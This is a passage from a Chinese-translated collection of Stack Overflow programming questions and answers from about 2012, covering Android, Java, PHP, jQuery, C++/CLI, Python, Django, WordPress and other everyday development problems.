按钮的图像以这种方式正确更改，但是如果有人使用 Android 设备的*后退按钮*，则按钮会显示单击图像（因为清楚地显示了上一个活动的最后一个实例）

如果我尝试使用代码：

```
public void onClick(View v) {
       if(v==ButtonName)
       ButtonName.setImageResource(R.drawable.clicked_button_image);
       ButtonName.setImageResource(R.drawable.unclicked_button_image);
       //action code                              

    } 
```

按钮的图像不会改变。

我该如何解决这个问题？（无需编辑 xml）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:01:33.097

当您单击返回按钮时如何更改？

```
@Override
public boolean onRestore()
{
    if(unclickedImageDisplayed)
    {
       ButtonName.setImageResource(R.drawable.unclicked_button_image);
    }

} 
```

如果您查看[文档](http://developer.android.com/reference/android/app/Activity.html)和活动生命周期，您可以看到`on Restore`当您返回活动时调用了该方法。

也许通过在更改按钮背景时更改一个私有变量，并通过检查此布尔值，例如，您可以更改按钮的背景，以编程方式为其赋予初始状态。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:08:48.143

为了达到这个效果，试试这个：

你必须在你的drawable文件夹中创建一个新的xml：（我叫button_action）

```
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:drawable="@drawable/clicked_button_image" android:state_pressed="true"/>
    <item android:drawable="@drawable/unclicked_button_image"/>
</selector> 
```

在您的布局中：

```
<Button
        android:id="@+id/infobtncontact"
        style="@style/ButtonNormal"
        android:layout_marginTop="10dp"
        android:background="@drawable/button_action"
        android:src="@drawable/unclicked_button_image" /> 
```

可能必须重新启动 Eclipse 才能识别更改。

请原谅我糟糕的英语！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:08:58.223

除非您解释为什么要使用此方法，否则您应该真正使用这样的自定义按钮

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
  <item android:state_pressed="true" android:drawable="@drawable/clicked_button_image" /> <!-- pressed -->
  <item android:state_focused="true" android:drawable="@drawable/focus_button_image" /> <!-- focused -->
  <item android:drawable="@drawable/unclicked_button_image"/> <!-- default -->
</selector> 
```

# java - 当您只知道它的名称时，是否有可能在 Java 中获得原始类型的 Class 对象？

> ID：11583821
> 
> 赞同：3
> 
> 时间：2012-07-20T16:57:42.570
> 
> 标签：java

对于原始类型：int、double、short 等...

鉴于：

```
String typeName = "double"; 
```

我怎么得到`double.class`？

对于常规课程，我们可以执行以下操作：

```
String typeName = "java.lang.Integer"
Class<?> clazz = Class.forName(typeName);  
// Class.forName(typeName) returns Double.class 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T17:04:42.913

与其尝试一些聪明的东西，因为只有 8 个原语，写一个 switch/case 语句，或者以其他方式对它们进行硬编码，比如 Map（Scorpion 在下面的评论中建议）会不会太糟糕？

[Spring Framework](http://git.springsource.org/spring-mobile/spring-android/blobs/063e6216bd746786532515cdc2f7f1d670e98fd0/src/main/java/org/springframework/util/ClassUtils.java#line121)将这种方法用于其 Class.forName 版本。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T17:09:34.367

你不能那样做。查看[反射文档](http://docs.oracle.com/javase/tutorial/reflect/class/classNew.html)。转到“Class.forName()”部分，在那里，您可以找到一条注释：

> 这不能用于原始类型。

一种选择可能是创建一个可以识别原始类型并返回匹配类的方法（即 Integer.class、Double.class 等......）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T17:59:19.293

如果您单击@mprivat 的链接并阅读“.class 语法”部分，您一开始会得到：

> 如果类型可用但没有实例，则可以通过将“.class”附加到类型名称来获得类。这也是获取原始类型的 Class 的最简单方法。

所以`double.class`工作得很好。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-01T06:09:59.510

当您只知道它的名称时，这是查找原始类型类的代码。

```
public class CheckPrimitve {
    public static void main(String[] args) {
        Sample s = new Sample();
        try {
            System.out.println(s.getClass().getField("sampleDouble").getType() == double.class); // returns true
            System.out.println(s.getClass().getField("sampleDouble").getType().isPrimitive()); // returns true
        } catch (NoSuchFieldException e) {          
            e.printStackTrace();
        } catch (SecurityException e) {
            e.printStackTrace();
        }       
    }
}

class Sample {
    public double sampleDouble;
    public Sample() {
        sampleDouble = 10d;
    }
} 
```

# php - 排序日期协助

> ID：11583822
> 
> 赞同：2
> 
> 时间：2012-07-20T16:57:46.307
> 
> 标签：php, date, usort

我正在尝试按我的模板字段之一（$fields[3]）对我的列表进行排序，该模板字段是一个带有日期的文本输入字段。问题是由于日期的格式，它不会正确排序，因为我猜它只是比较数字。

我想我需要在排序之前更改日期格式，但到目前为止还没有做到这一点。

我正在尝试像这样使用 usort 函数（字段 3 是日期格式为 dd/mm/yyyy 的字段），

```
if (!function_exists('do_sort')) {
    function do_sort($a, $b) {
        return $a->fields[3] > $b->fields[3];
    }}

$data = $params['data'];
usort($data, 'do_sort');
$smarty->assign('sorted', $data); 
```

这对数据进行了排序，但和以前一样，因为我没有更改任何内容，而且顺序不正确。谁能帮我在排序前重新格式化日期？

非常感谢

克里斯

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T17:10:19.093

设法做到了。如果其他人有兴趣，我使用以下功能：

```
 function date_compare($a, $b)
    {
        $t1 = strtotime($a->fields[3]);
        $t2 = strtotime($b->fields[3]);
        return $t1 - $t2;
    }    
    $data = $params['data'];
    usort($data, 'date_compare');
    $smarty->assign('sorted', $data); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:01:16.750

尝试先将字符串转换为时间戳：

```
function do_sort($a, $b) {
    $aval = strtotime($a);
    $bval = strtotime($b);
    if ($aval == $bval) {
        return 0;
    }
    return $aval < $bval ? -1 : 1;
} 
```

# android - 为什么在 DialogFragment 实例化时执行不会停止？

> ID：11583828
> 
> 赞同：0
> 
> 时间：2012-07-20T16:58:03.497
> 
> 标签：android

为什么显示时执行不停止`DialogFragment`？

```
public void someMethod() {
    methodeOne();
    new FeedbackAlertDialog().show(getFragmentManager(), "tag"); // DialogFragment opened
    methodeTwo(); // Looking in logs this is executed when DialogFragment is shown
} 
```

通常，当其他一些尚未完成时，执行会停止。你能解释一下吗。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:02:31.827

> 为什么显示 DialogFragment 时执行不会停止？

`show()`是一个异步调用。`methodeTwo()`调用时，对话框甚至不在屏幕上。

# java - 在不使用 Calendar 或 Joda 的情况下将月份添加到 java DATE 类型的最简单方法？

> ID：11583829
> 
> 赞同：-3
> 
> 时间：2012-07-20T16:58:04.830
> 
> 标签：java, date, websphere-process-server

我在一个集成环境（IBM Process Server）中工作，我无法导入任何东西，只能使用标准的 java 功能。

如何在给定日期添加 x 个月？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:07:19.160

假设您默认导入了日期，您可以通过以下方式向日期对象添加月份数：

```
public void addMonths(Date date, int numMonths){
    date.setMonth((date.getMonth() - 1 + numMonths) % 12 + 1);
} 
```

**笔记**

您可以通过使用它们的完整包名来使用 Java SE 中的外部类。即，即使您无法添加`import java.util.Calendar;`到文件的顶部`.java`，您仍然可以通过执行创建日历对象`java.util.Calendar cal = java.util.Calendar.getInstance();`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-09T12:38:42.893

如果您想在不使用日历的情况下实现，请使用 @ewok 建议，如果使用不推荐使用的方法出现问题，请使用以下代码：

```
SimpleDateFormat dt1 = new SimpleDateFormat("yyyy-MM-dd");  //Date format
    SimpleDateFormat dt = new SimpleDateFormat("MM");
    Date date = dt1.parse("2013-12-31");
    int dm=0;
    int m = Integer.parseInt(dt.format(date));
    switch(m){
        case 2:
            m = 27;
        break;
        case 4:
        case 6:
        case 9:
        case 11:
            m = 29;
        break;
        default:
            m = 30;
        break;
    }// Closing switch block
    long month = Math.round(1000*60*60*24.25*m);
    long oneMonthTime =  date.getTime()+month;
    System.out.println(dt1.format(oneMonthTime)); 
```

此代码不适用于闰年。我知道它不完美但仍然可以工作的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-24T12:24:15.783

@ewok 的答案在超过年底时并不总是有效，只有**`numMonths`设置为低于或等于到明年一月的月份的值**：

SSCCE：

```
public static  void main(String[] args) {
  for(int i=0;i<10; i++) {
    Date date = new Date();
    Date updated = (Date)date.clone();
    addMonths(updated, i);
    System.out.println(" original: " + date+  " adding " +i+ " months: " + updated);
  }
}

public static void addMonths(Date date, int numMonths){
  date.setMonth((date.getMonth() - 1 + numMonths) % 12 + 1);
} 
```

输出：

```
original: Sat Aug 24 14:02:17 CEST 2013 adding 0 months: Sat Aug 24 14:02:17 CEST 2013
original: Sat Aug 24 14:02:17 CEST 2013 adding 1 months: Tue Sep 24 14:02:17 CEST 2013
original: Sat Aug 24 14:02:17 CEST 2013 adding 2 months: Thu Oct 24 14:02:17 CEST 2013
original: Sat Aug 24 14:02:17 CEST 2013 adding 3 months: Sun Nov 24 14:02:17 CET 2013
original: Sat Aug 24 14:02:17 CEST 2013 adding 4 months: Tue Dec 24 14:02:17 CET 2013
original: Sat Aug 24 14:02:17 CEST 2013 adding 5 months: Fri Jan 24 14:02:17 CET 2014
original: Sat Aug 24 14:02:17 CEST 2013 adding 6 months: Sun Feb 24 14:02:17 CET 2013
original: Sat Aug 24 14:02:17 CEST 2013 adding 7 months: Sun Mar 24 14:02:17 CET 2013
original: Sat Aug 24 14:02:17 CEST 2013 adding 8 months: Wed Apr 24 14:02:17 CEST 2013
original: Sat Aug 24 14:02:17 CEST 2013 adding 9 months: Fri May 24 14:02:17 CEST 2013 
```

**请注意**，二月、三月等日期早在 2013 年！由于奇怪的算术，代码存在缺陷...... setMonth 也处理 > 12 的值......

已更正（尽管仍在使用已弃用的方法...）：

```
 date.setMonth((date.getMonth() + numMonths) ); 
```

输出：

```
original: Sat Aug 24 14:13:09 CEST 2013 adding 0 months: Sat Aug 24 14:13:09 CEST 2013
original: Sat Aug 24 14:13:09 CEST 2013 adding 1 months: Tue Sep 24 14:13:09 CEST 2013
original: Sat Aug 24 14:13:09 CEST 2013 adding 2 months: Thu Oct 24 14:13:09 CEST 2013
original: Sat Aug 24 14:13:09 CEST 2013 adding 3 months: Sun Nov 24 14:13:09 CET 2013
original: Sat Aug 24 14:13:09 CEST 2013 adding 4 months: Tue Dec 24 14:13:09 CET 2013
original: Sat Aug 24 14:13:09 CEST 2013 adding 5 months: Fri Jan 24 14:13:09 CET 2014
original: Sat Aug 24 14:13:09 CEST 2013 adding 6 months: Mon Feb 24 14:13:09 CET 2014
original: Sat Aug 24 14:13:09 CEST 2013 adding 7 months: Mon Mar 24 14:13:09 CET 2014
original: Sat Aug 24 14:13:09 CEST 2013 adding 8 months: Thu Apr 24 14:13:09 CEST 2014
original: Sat Aug 24 14:13:09 CEST 2013 adding 9 months: Sat May 24 14:13:09 CEST 2014 
```

**需要考虑的事项**

*   几个月的最后几天，来自 setMonth() 的 Java 文档：

    > 将此日期的月份设置为指定值。修改此 Date 对象，使其表示指定月份内的一个时间点，其中年、日期、小时、分钟和秒与以前相同，以本地时区解释。**例如，如果日期是 10 月 31 日，并且月份设置为 6 月，那么新日期将被视为 7 月 1 日，因为 6 月只有 30 天。**

*   仍然不推荐使用 - 但是正确解决问题会非常耗时（例外情况，闰日，闰秒等），更不用说彻底改造轮子......也许将日历修剪到最低限度，并将其粘贴到代码会解决它 - 但即使这样也不值得麻烦......

*   绝对应该尝试@ewok 建议的第二种方法，即完全限定的类名。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2018-01-31T06:36:37.260

# zend-framework - 模块引导程序的执行

> ID：11583835
> 
> 赞同：0
> 
> 时间：2012-07-20T16:59:06.507
> 
> 标签：zend-framework

有没有办法让基础引导和模块引导？

这是我的应用程序结构

```
- application
  - modules
    - admin
      - controllers
      - Bootstrap.php
    - public
      - controllers
      - Bootstrap.php
  - Bootstrap.php
- libraries 
```

当我测试我的应用程序时，仅执行基本引导程序。我用这个（在基本引导程序中）强制执行模块引导程序：

```
$modules = array('admin', 'public');
foreach ($modules as $module) {
    $path = APP_PATH . '/modules/' . $module . '/Bootstrap.php';
    $class = ucfirst($module) . '_Bootstrap.php';
    include_once $path;
    $bootstrap = new $class($this);
    $bootstrap->bootstrap();
} 
```

只有这样我才能执行模块的引导。还有其他方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:56:15.970

模块资源运行模块引导程序。这是由以下情况触发的：

```
resources.modules[] = "" 
```

在你的`application.ini`, 或者你可以手动引导你的主引导类中的模块。

# c# - 在纵向模式下滚动

> ID：11583839
> 
> 赞同：-3
> 
> 时间：2012-07-20T16:59:36.577
> 
> 标签：c#, microsoft-metro

我一直在环顾四周，但仍然找不到在平板电脑处于纵向模式时启用水平滚动的任何解决方案。我的内容都在我的滚动条内。如果可以提供一些帮助，我将不胜感激。首选 XAML。

```
 <ScrollViewer HorizontalAlignment="Left" Height="764"
               VerticalAlignment="Top" Width="1353"
               VerticalScrollMode="Disabled" IsVerticalRailEnabled="False"> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:36:44.300

你试过了吗：

```
<ScrollViewer HorizontalScrollMode="Enabled" /> 
```

[在这里](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.controls.scrollviewer.horizontalscrollmode)阅读更多关于这个人的信息。

另外 - 还有哪些其他控件可能会影响此行为？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:45:24.837

您的问题似乎是您正在调整滚动查看器的大小以适应横向模式：控件的高度为 768 像素，而宽度为 1353 像素。因此，您的滚动查看器比您的屏幕更宽，并且超出了边缘。Scrollviewer 滚动其内容，但它滚动到控件的大小，而不是屏幕。

因此，当您转换到纵向视图时，您需要调整控件的大小以适应屏幕的范围。（或者可能只是让滚动查看器自动调整大小可能会暂时解决您的问题。）

# javascript - 使用 cookie 重定向

> ID：11583841
> 
> 赞同：0
> 
> 时间：2012-07-20T16:59:38.940
> 
> 标签：javascript, html, redirect, cookies

我做了一个网站，在我的索引页面上有两个链接。一个指向 /eng/index.htm，第二个指向 /hr/index.htm。我还在每个 /eng/ 页面和每个 /hr/ 页面上添加了一个“切换到”选项以切换到其他语言。

我正在尝试制作能够记住用户选择的 cookie，下次他进入索引页面时，它会将他重定向到他第一次选择的语言的索引页面。如果用户点击了“切换到”链接，是否可以更改为 cookie。

我已经尝试过这个站点的许多 java 脚本和建议，但没有运气。:(

我已将此添加到我的语言索引页面：

```
<script language="JavaScript" type="text/javascript"> 
var d = new Date() 
var dMonth = d.getTime() + 30*24*60*60*1000 
d.setTime(dMonth) 
document.cookie = 'startPage=' + location.href + '; expires=' + d.toGMTString() 
function deleteCookie(){ 
var d = new Date(2000,1,1) 
document.cookie = 'startPage=' + location.href + '; expires=' + d.toGMTString() 
} 
</script> 
```

这是我的索引页：

```
<script language="JavaScript" type="text/javascript"> 
 var c = document.cookie.split(';') 
 if(c.length >0){ 
 for(m=0;m<c.length;m++){ 
if(c[m].indexOf('startPage')>-1){ 
location.replace(c[m].split('=')[1]) 
} 
} 
} 
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-10-03T21:53:16.070

你需要添加 domain=example.com; 您的 cookie 也是如此，因为您将在第二页上设置它，但在索引页上阅读它。要切换到 thing 工作，只需运行删除 cookie 功能并使用相应的 url 创建一个新的。

# types - PowerBuilder 与 long、longlong、integers、dec 和 decimal 数据类型有关的问题

> ID：11583842
> 
> 赞同：0
> 
> 时间：2012-07-20T16:59:47.853
> 
> 标签：types, decimal, powerbuilder

我在 PowerBuilder 12.5 Classic 中遇到了 long、longlong、integer、dec 和 decimal 数据类型的问题……
我做了这样的事情并且给了我数据类型的问题；

```
// set variables for item price and the cash given by the customer

double price, cash

price=double(trim(sle_price.text))
cash=double(trim(sle_cash.text))

if cash="" then
    messagebox("","CASH")
    sle_cash.setfocus()
    return
end if

if  fare="" then
    messagebox("","SET FARE")
    sle_amount.setfocus()
    return
end if
double balance

balance=cash -price

 messagebox("",balance)

INSERT INTO cash_table  
         ( items.price   

  VALUES ( :price ); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-27T16:21:30.143

从我的评论

> 为什么您尝试将 double 与字符串进行比较？

比较不同的类型是非法的。正确的例子

```
if trim(sle_cash.text) = "" then 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-27T08:13:59.453

我认为您正在比较`double cash`变量`double fare`以`"" (empty string)`了解输入字段是否为空。代替这种方式，您可以执行以下操作：

```
if trim(sle_cash.text)="" then
    messagebox("","CASH")
    sle_cash.setfocus()
    return
end if

if  trim(sle_fare.text)="" then
    messagebox("","SET FARE")
    sle_amount.setfocus()
    return
end if 
```

# c++ - 无法从 'cli::interior_ptr 转换参数 1 ' 到 'CvCapture **'

> ID：11583851
> 
> 赞同：5
> 
> 时间：2012-07-20T17:00:01.660
> 
> 标签：c++, opencv, c++-cli

我正在捕获如下视频帧

```
CvCapture *capture = cvCreateFileCapture("PATH"); 
```

我可以阅读视频并进行处理。一切正常。但是当我尝试释放捕获

```
cvReleaseCapture( &capture ); 
```

我明白了

```
error C2664: 'cvReleaseCapture' : cannot convert parameter 1 from
 'cli::interior_ptr<Type>' to 'CvCapture **'
          with
          [
              Type=CvCapture *
          ]
          Cannot convert a managed type to an unmanaged type 
```

该函数在一个类中。

```
public ref class Locator 
```

我从主要调用它

定位器 r;

在我将 * *public ref **添加到*类定位器*之前，它没有给我任何错误。

修复它的任何想法？在切换到 c++-cli 之前它工作正常。

我认为这与一些堆问题有关，堆上的项目可以作为垃圾收集的结果移动。为了向本地方法/函数发送指针，您需要在调用期间“固定”指针，但我不知道如何。

谢谢。

更新：

那解决了它。

```
pin_ptr<CvCapture*> p;
p = &capture;
cvReleaseCapture( p ); 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-22T17:06:55.253

(Adding as answer, thanks to @AlexFarber for the correction)

Have you tried pin_ptr? Something like:

```
pin_ptr<CvCapture*> pCapture = &capture; 
```

# asp.net-mvc-3 - Orchard CMS：将用户与内容类型或配置文件数据联系起来

> ID：11583853
> 
> 赞同：0
> 
> 时间：2012-07-20T17:00:06.573
> 
> 标签：asp.net-mvc-3, orchardcms

我安装了配置文件模块[http://orchardprofile.codeplex.com/](http://orchardprofile.codeplex.com/)但我想知道实现以下内容的最佳方法是什么：

让用户通过个人资料跟踪“BMI”。用户通过他们的个人资料输入 BMI（体重指数），这些值将被保存。将显示一个图表，说明一段时间内保存的值。

这只是一个例子。我想知道做这种事情的最佳方法是什么......

作为补充问题，是否可以创建新的内容类型，然后将其“链接”到特定用户？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T10:59:18.560

要随时间存储这些值，您可能应该创建自己的部件并让它存储一个记录列表，每个记录都应该有一个日期和一个 BMI 值。有关建立关系所需工作的描述，请参见[http://docs.orchardproject.net/Documentation/Creating-1-n-and-nn-relations 。](http://docs.orchardproject.net/Documentation/Creating-1-n-and-n-n-relations)

在 1.5 中，使用新的内容选择器可以很容易地链接内容项，至少对于最简单的关系类型是这样。

# javascript - 如何将按钮事件与唯一控件关联？

> ID：11583861
> 
> 赞同：2
> 
> 时间：2012-07-20T17:00:37.183
> 
> 标签：javascript, jquery, html

我有这个表格[http://jsfiddle.net/thiswolf/XDsSt/](http://jsfiddle.net/thiswolf/XDsSt/)有四个相同的输入和按钮。问题是，每个部分都在数据库中更新它自己的唯一数据，所以在更新时，我点击更新的提交按钮很重要仅包含来自该部分的输入的数据库。

我的功能是

```
$(document).ready(function() {
          $(".xx").live('click', function(){
         alert('clicked');
         });
        }); 
```

我如何确保按钮单击对于该部分是唯一的？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-20T17:03:27.977

对每个输入按钮使用一个 ID 值。这样，jQuery 可以像这样识别它：

```
$('#button_tag'); 
```

**HTML**：

```
<html>
    <head></head>
    <body>
        <section>
            <input type="text" value="Town">
            <input type="text" value="Mayor">
            <input type="text" value="Highway">
            <input id="btn1" type="submit" class="xx" value="Submit">
        </section>
        <section>
            <input type="text" value="Town">
            <input type="text" value="Mayor">
            <input type="text" value="Highway">
            <input id="btn2" type="submit" class="xx" value="Submit">
        </section>
        <section>
            <input type="text" value="Town">
            <input type="text" value="Mayor">
            <input type="text" value="Highway">
            <input id="btn3" type="submit" class="xx" value="Submit">
        </section>
        <section>
            <input type="text" value="Town">
            <input type="text" value="Mayor">
            <input type="text" value="Highway">
            <input id="btn4" type="submit" class="xx" value="Submit">
        </section>
    </body>

</html> 
```

**Javascript**：

```
$(document).ready(function () {
    $(".xx").live('click', function () {
        alert('clicked ' + $(this).attr('id'));
    });
}); 
```

**JsFiddle**：

[http://jsfiddle.net/XDsSt/7/](http://jsfiddle.net/XDsSt/7/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:08:25.510

获取按钮所属的对应部分。然后访问其中的元素。您可以为此使用 jQuery `closest()`/ `parent()`（如果只有一层控件层次结构）功能。

```
$(document).ready(function() {
     $(".xx").live('click', function(e){
       e.preventDefault();  //if you want to prevent normal form submit
       var item=$(this);
       var sectionClicked=item.closest("section");
       //Let's alert the first text box   
       alert(sectionClicked.find("input").first().val());
       //do whatever with the items belongs the current section

     });
}); 
```

示例：http: [//jsfiddle.net/XDsSt/8/](http://jsfiddle.net/XDsSt/8/)

我建议您切换到 jQuery[`on`](http://api.jquery.com/on/)而不是`live`因为它已被弃用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T17:11:39.847

```
$(document).ready(function() {
    $(".xx").live('click', function() {
        $('section').has(this).find(':input:text').each(function() {
            alert( this.value )            ;
        });
    });
}); 
```

**[演示](http://jsfiddle.net/XDsSt/10/)**

如果可能，请`.live()`使用`.on()`jQUery 1.7+ 代替 ，因为`live()`已弃用。

```
$(document).ready(function() {
    $("body").on('click', '.xx', function() {
        $('section').has(this).find(':input:text').each(function() {
            alert( this.value )            ;
        });
    });
}); 
```

**[演示](http://jsfiddle.net/XDsSt/12/)**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T17:14:15.613

如果 id 不是一个选项 - 我不明白，但你可以在按钮中放置多个类

```
 <input type="button" class="xx btn1" ... >

           $(document).ready(function() {
                $(".xx").live('click', function(){   // look into on instead on live
                 if $(this).hasclass('btn1');{
                 alert('clicked');
                      }
                   });
               }); 
```

# tsql - 总允许变量

> ID：11583867
> 
> 赞同：0
> 
> 时间：2012-07-20T17:01:05.190
> 
> 标签：tsql, sql-server-2005

使用 SQL Server 2005 并拥有一个我现在必须维护的存储过程（不是我编写的）。这是一个重要的查询，我想进行一些更改以使其更易于维护，而无需完全重写整个内容。只是探索一些选择，所以...

存储过程中可以有多少个变量（有限制）？

```
DECLARE @MyVariable int 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:21:07.380

根据[这篇文章](http://msdn.microsoft.com/en-us/library/ms191132%28SQL.105%29.aspx)，可以传递给存储过程的参数限制为 2100 个，所以我假设你至少可以做那么多变量。

**编辑：**

每篇文章：

> 存储过程中局部变量的最大数量仅受可用内存的限制。

# python - 为什么 Python 的 'all' 函数这么慢？

> ID：11583869
> 
> 赞同：4
> 
> 时间：2012-07-20T17:01:07.780
> 
> 标签：python, performance

我写了一些非常简单的测试（我知道，它们不是“结论性的”，但它们让我很好奇）。我跑着优化和所有的爵士乐。

```
from time import time

alist = [ 2, 4, 6, 8, 10, 12, 24, 48, 64, 128 ]

def all_even( alist ):
    for val in alist:
        if not (val & 1) == 0:
            return False
    return True

def all_even_bad( alist ):
    result = False
    for val in alist:
        if not (val & 1) == 0:
            result = False
        else:
            result = True
    return result

def main():
    start = time()
    for i in range(1, 10000):
        all_even( alist )
    print('All even: {0}'.format(time() - start))

    start = time()
    for i in range(1, 10000):
        all_even_bad( alist )
    print('All even bad: {0}'.format(time() - start))

    start = time()
    for i in range(1, 10000):
        all( val & 1 == 0 for val in alist )
    print('All one: {0}'.format(time() - start))

if __name__ == '__main__':
    main() 
```

我得到了结果：

```
> All even: 2.86299991608 
> All even bad: 3.71399998665 
> All one: 3.89900016785 
```

看来内置功能不会提前退出？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-20T17:11:25.337

`all()`肯定会提前退出，我认为行为差异只是创建生成器所需的开销的结果。

这是一些`all()`确实提前退出的证据：

```
In [8]: alist = [3] + [0] * 2**20    # alist bigger, with an early odd

In [10]: %timeit all_even(alist)
1000000 loops, best of 3: 309 ns per loop

In [11]: %timeit all_even_bad(alist)
10 loops, best of 3: 133 ms per loop

In [12]: %timeit all(val & 1 == 0 for val in alist)
1000000 loops, best of 3: 891 ns per loop 
```

请注意，即使`all()`比`all_even()`这里慢，它仍然比不提前退出的函数版本快得多。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T17:11:36.003

您没有未通过测试的元件，因此无法使其短路。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T17:11:26.473

由于您列表中的所有数字实际上都是偶数，所以它不能在逻辑上提前退出吗？您调用的开销`all()`可能来自`generator`对象的构造。

# django - Django：是否可以在 QueryDict 上进行过滤？

> ID：11583870
> 
> 赞同：0
> 
> 时间：2012-07-20T17:01:07.917
> 
> 标签：django

在我的`form.data`里面我有一个 QueryDict。

```
 QueryDict: <QueryDict: {u'deal_status_2': [u'1'], 
                     u'deal_status_1': [u'2'], u'subject': [u'wdes']}> 
```

`deal_status_1`并且`deal_status_2`都是通过 jquery 作为表单的一部分动态生成的。

除了在 form.data 中，我在 POST 表单上的其他任何地方都找不到它们。

很好，现在我需要这些值。

所以我认为如果我可以像这样过滤 QueryDict 会很棒

```
var array = form.data.filter(???__istartswith('deal_status_') 
```

并获取我需要迭代并从中获取值的所有动态生成的字段的数组。

这可能吗？我`???`在里面放什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2020-01-05T00:28:37.697

是的，使用：

```
query = querydict

ModelObject.filter(**query.dict()) 
```

[https://coderwall.com/p/gtwm1q/pass-a-querydict-to-a-django-queryset](https://coderwall.com/p/gtwm1q/pass-a-querydict-to-a-django-queryset)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T17:15:14.177

不，这是不可能的。

尝试这个：

```
my_data = []
for q, v in form.data.items():
    if q.startswith('deal_status_'):
        my_data += v 
```

# c# - 无法让 OpenHardwareMonitorLib.dll 工作

> ID：11583871
> 
> 赞同：0
> 
> 时间：2012-07-20T17:01:10.083
> 
> 标签：c#, dll, hardware-interface, openhardwaremonitor

我发现很少有关于如何让 OHM 在 c# 中工作的例子

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using OpenHardwareMonitor.Hardware;

namespace OpenHardwareMonitorReport
{

    class Program
    {

        static void Main(string[] args)
        {
            Computer computer = new Computer();
            computer.Open();

            var temps = new List<decimal>();
            foreach (var hardware in computer.Hardware)
            {
                if (hardware.HardwareType != HardwareType.CPU)
                    continue;
                hardware.Update();
                foreach (var sensor in hardware.Sensors)
                {
                    if (sensor.SensorType != SensorType.Temperature)
                    {
                        if (sensor.Value != null)
                            temps.Add((decimal)sensor.Value);
                    }
                }
            }

            foreach (decimal temp in temps)
            {
                Console.WriteLine(temp);
            }
            Console.ReadLine();
        }
    }
} 
```

这应该显示一些传感器数据，但是当我运行它时，它会给我这个错误：

托管调试助手“PInvokeStackImbalance”在“C:\Users\Josh\Desktop\DLLTutorial\HardwareMonitor\HardwareMonitor\bin\Debug\HardwareMonitor.vshost.exe”中检测到问题。附加信息：对 PInvoke 函数 'PInvokeDelegateFactoryInternalAssembly!PInvokeDelegateFactoryInternalWrapperType13::ADL_Main_Control_Create' 的调用使堆栈失衡。这可能是因为托管 PInvoke 签名与非托管目标签名不匹配。检查 PInvoke 签名的调用约定和参数是否与目标非托管签名匹配。

我已经从 OHM svn 下载了 .dll，将其放入我的项目中，添加了对它的引用，它在“computer.Open();”行上崩溃了 我在上面发布的那个错误。

请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T21:00:12.050

显然是我的设置有问题。它不会在其他系统上失败......当这种情况发生时，你不要讨厌它。

# wordpress - 更改用户图片大小 n wordpress get_avatar(get_the_author_meta('user_email'), 75)

> ID：11583875
> 
> 赞同：0
> 
> 时间：2012-07-20T17:01:19.383
> 
> 标签：wordpress

我有网站[http://insideoutdogtraining.com/young-calicoe-dog-fighting](http://insideoutdogtraining.com/young-calicoe-dog-fighting)，作者框使用插件[http://dempseymarketing.com/products/relauthor-plugin-for-wordpress/](http://dempseymarketing.com/products/relauthor-plugin-for-wordpress/)在帖子内容下。

但我想增加作者图像的大小，使其适合主要作者框 div。但是我更改了 get_avatar 中没有用的任何其他值，它仅显示 50x50。我如何增加图像的大小？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-27T09:35:33.890

如果您的主题支持自定义 css，请尝试添加此 css 以使其看起来更漂亮：

```
.author-title {margin-top: 0;}
.data-image .avatar {border-radius: 6px; width: 80px; height: 80px;}
.author-box {width: 100%; padding: 0 30px 20px 0; clear: both;} 
```

你会得到这样的结果：http: [//prntscr.com/6aenaz](http://prntscr.com/6aenaz)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T17:38:11.673

为什么不在你的主题中使用这行代码而不是插件？

```
<?php if ( get_the_author_meta( 'description' ) && ( ! function_exists(  'is_multi_author' ) || is_multi_author() ) ) : // If a user has filled out their  description and this is a multi-author blog, show a bio on their entries ?>
        <div id="author-info">
            <div id="author-avatar">
                <?php echo get_avatar( get_the_author_meta( 'user_email' ), apply_filters( 'yourthemesname_author_bio_avatar_size', 68 ) ); ?>
